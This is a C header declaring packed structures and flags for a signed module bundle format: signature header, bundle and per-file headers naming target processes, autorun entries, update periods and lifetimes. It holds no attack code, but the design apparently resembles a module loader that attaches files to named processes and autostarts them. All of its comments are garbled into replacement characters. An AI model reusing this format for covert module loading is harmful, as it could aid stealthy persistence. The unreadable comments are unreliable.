#ifndef __MODSHARED_PACK_PROTECT_H_
#define __MODSHARED_PACK_PROTECT_H_

#pragma pack(push, 1)
typedef struct _sign_pack_header_t
{
    uint32_t sizeOfFile;// ������ ����� ������� ������ ���������.
    uint8_t sign[512];  // 4096-������ �������.
    uint32_t origSize;  // ������������ ������ ����� (����� ����������).
    uint32_t reserved1; // ������������ ��� ��������� �����.
} sign_pack_header_t, *psign_pack_header_t;

typedef struct _bundle_header
{
    uint32_t sizeOfPack; // ������ ���� ����� ��� ����� �������� ���������.
    uint32_t numberOfFiles; // ���������� ������ � �����.
    uint32_t nameLen; // ����� ����� ������.
    char name[ZFS_MAX_FILENAME]; // ��� ������, ������� ��������� ����� �������������� ��� �������� ����� � /usr/.
    uint32_t updatePeriod; // ������ � ������� ����� ��������� �� �������� ������� ���������� ������.
    uint32_t lifetime; // ����� ����� ������ � ����� ������� � �������, ����� ������� ��� ����������. (0 - ����������).
    uint32_t flags; // �����.
} bundle_header_t, *pbundle_header_t;

typedef struct _bundle_file_header
{
    char fileName[ZFS_MAX_FILENAME]; // ��� �����.
    uint32_t fileSize;          // ������ �����.
    uint32_t flags;             // �����, � ������� ����� ����������� ���������� ����������� ��� ��������� ��������� ����� ���������.
    uint32_t processesCount;    // ���������� ���������, � ������� ���������� ������������/������������ ��� �������.
    char process1Name[64];      // ��� ������� ��������.
} bundle_file_header_t, *pbundle_file_header_t;

typedef struct _zautorun_config_entry
{
    char fileName[4 * ZFS_MAX_FILENAME];      // ��� ������������ �����.
    char processName[64];   // ��� ��������.
    uint32_t flags;         // �����.
} zautorun_config_entry_t, *pzautorun_config_entry_t;

typedef struct _bundle_info_entry
{
    uint32_t updatePeriod;
    int64_t remainTime;
    char name[ZFS_MAX_FILENAME];
    uint8_t sha1[20];
} bundle_info_entry_t, *pbundle_info_entry_t;
#pragma pack(pop)

#define ANY_PROCESS '*'

#define BFLAG_UPDATE        0x00000001 // ���� ��������� �� ��, ��� ����� �������� ����������.

#define FLAG_IS64           0x00000001 // (q) ���� ��������� �� 64-�������� ������.
#define FLAG_ISEXEC         0x00000002 // (x) ���� ��������� �� ������������� �����. ���� ���� ���� �� ���������, ������ ���� �������� ��� ������-������ ��� �������, ������� �� ������ �������������� ���������.
#define FLAG_SAVE_TO_FS     0x00000004 // (s) ���� ��������� �� ��, ��� ���� ������ ���� ������� � �������� �������.
#define FLAG_AUTOSTART      0x00000008 // (a) ���� ��������� �� ������������� ��������� ������ ������ ��� ��� ������� �������.
#define TFLAG_FAKE          0x20000000 // Template flag.
#define TFLAG_EXISTING      0x40000000 // Template flag.
#define FLAG_NEW_MODULE     0x80000000

#endif // __MODSHARED_PACK_PROTECT_H_
